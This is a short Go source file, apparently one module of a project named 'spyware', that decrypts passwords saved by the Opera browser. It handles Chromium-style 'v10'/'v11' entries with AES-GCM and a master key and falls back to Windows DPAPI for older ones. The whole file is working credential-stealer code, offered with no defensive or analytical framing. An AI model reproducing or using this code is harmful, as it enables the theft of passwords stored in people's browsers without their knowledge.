package opera

import (
		"github.com/Nevesto/spyware/crypto"
)

func DecryptPassword(encryptedPassword, masterKey []byte) (string, error) {
	if len(encryptedPassword) > 15 {
		if string(encryptedPassword[:3]) == "v10" || string(encryptedPassword[:3]) == "v11" {
			iv := encryptedPassword[3:15]
			payload := encryptedPassword[15:]
			decrypted, err := crypto.AesGCMDecrypt(payload, masterKey, iv)
			if err != nil {
				return "", err
			}
			return string(decrypted), nil
		}
	}
	decrypted, err := crypto.DPAPI(encryptedPassword)
	if err != nil {
		return "", err
	}
	return string(decrypted), nil
}